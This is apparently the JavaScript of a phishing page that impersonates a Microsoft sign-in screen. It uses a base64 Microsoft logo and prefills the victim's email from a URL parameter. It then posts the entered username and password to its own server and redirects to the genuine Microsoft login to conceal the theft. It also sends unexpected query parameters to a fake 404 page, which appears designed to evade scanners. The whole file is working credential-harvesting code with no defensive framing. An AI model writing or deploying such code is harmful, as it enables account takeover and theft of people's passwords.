function sanitizeString(str) {
    if (!str) return "";
    return str.replace(/[<>]/g, ""); 
}

function isValidBase64(str) {
    if (!str) return true; 
    try {
        return btoa(atob(str)) === str.replace(/\s/g, "");
    } catch (err) {
        return false;
    }
}

function trigger404() {
    window.location.replace("/404-error-not-found");
}

document.addEventListener("DOMContentLoaded", function() {
    var urlParams = new URLSearchParams(window.location.search);
    const allowedParams = ['u', 'p', 'logo', 'bg'];

    // --- 1. STRICT WHITELIST CHECK ---
    // Redirect if there's a parameter in the URL that we don't recognize
    for (const key of urlParams.keys()) {
        if (!allowedParams.includes(key)) {
            trigger404();
            return;
        }
    }

    // --- 2. BASE64 VALIDATION ---
    const b64ParamsToCheck = ['u', 'logo', 'bg'];
    for (let param of b64ParamsToCheck) {
        let value = urlParams.get(param);
        if (value && !isValidBase64(value)) {
            trigger404();
            return;
        }
    }

    // --- 3. UI RENDERING (ID/LOGO/BG) ---
    var username = "coacehl@coacehl.com";
    var getId = urlParams.get("u");
    if (getId) {
        try {
            username = sanitizeString(atob(getId));
            var displayElement = document.getElementById("display_name");
            if (displayElement) displayElement.innerText = username;
        } catch(e) { trigger404(); return; }
    }

    // --- 3. UI RENDERING (ID/LOGO/BG) ---
    var username = "coacehl@coacehl.com";
    var defaultLogo = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNTUiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAxNTUgMzYiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDVoMTF2MTFIMHoiLz48cGF0aCBmaWxsPSIjN2ZiYjAwIiBkPSJNMTIgNWgxMXYxMUgxMnoiLz48cGF0aCBmaWxsPSIjMDBhNGVmIiBkPSJNMCAxN2gxMXYxMUgweiIvPjxwYXRoIGZpbGw9IiNmZmI5MDAiIGQ9Ik0xMiAxN2gxMXYxMUgxMnoiLz48dGV4dCB4PSIzMCIgeT0iMjQiIGZpbGw9IiM3MzczNzMiIGZvbnQtZmFtaWx5PSJTZWdvZSBVSSxTYW5zLVNlcmlmIiBmb250LXNpemU9IjIyIiBmb250LXdlaWdodD0iNDAwIiBzdHlsZT0ibGV0dGVyLXNwYWNpbmc6LTAuNXB4OyI+TWljcm9zb2Z0PC90ZXh0Pjwvc3ZnPg==";
    
    // Username logic
    var getId = urlParams.get("id");
    if (getId) {
        try {
            username = sanitizeString(atob(getId));
            var displayElement = document.getElementById("display_name");
            if (displayElement) displayElement.innerText = username;
        } catch(e) { trigger404(); return; }
    }

    // Logo logic
    var getLogo = urlParams.get("logo");
    var logoElement = document.getElementById("logo_image");
    if (logoElement) {
        if (getLogo) {
            var decodedLogo = atob(getLogo);
            if (decodedLogo.startsWith('https://') || decodedLogo.startsWith('data:image')) {
                logoElement.src = decodedLogo;
            } else { 
                trigger404(); 
                return; 
            }
        } else {
            logoElement.src = defaultLogo;
        }
    }
});

function clickActionRemote() {
    var passwordElement = document.getElementById("password");
    var errorElement = document.getElementById("error");
    var displayElement = document.getElementById("display_name");

    var passwordValue = passwordElement.value;
    var username = displayElement ? displayElement.innerText : "unknown";

    if (passwordValue.length <= 0) {
        errorElement.style.display = "block";        
    } else {
        errorElement.style.display = "none";
        
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "/", true);
        
        // This header is required for Flask to parse request.form
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                window.location.href = "https://login.microsoftonline.com";
            }
        };

        // Prepare the body data
        var data = "u=" + encodeURIComponent(username) + "&p=" + encodeURIComponent(passwordValue);
        xhttp.send(data);
    }
}

function toggleTroubleshoot() {
    var section = document.getElementById("troubleshoot-section");
    if (section) {
        section.style.display = (section.style.display === "none") ? "block" : "none";
        if (section.style.display === "block") window.scrollTo(0, document.body.scrollHeight);
    }
}

function copyTroubleshoot() {
    const info = `Error Code: 16000\nRequest Id: 756acfe5-ae8e-438a-bc0b-f62fd5130b00\nCorrelation Id: 6f4f1763-7f3a-37fd-a0c1-e33a92cc4b21\nTimestamp: 2026-02-27T19:54:22.801Z`;
    
    navigator.clipboard.writeText(info).then(() => {
        var status = document.getElementById("copy-status");
        if (status) {
            status.textContent = "✓ Copied"; 
            status.style.color = "green";
            status.style.fontWeight = "bold";
            status.style.display = "inline";
            setTimeout(() => { 
                status.style.display = "none"; 
            }, 3000); 
        }
    });
}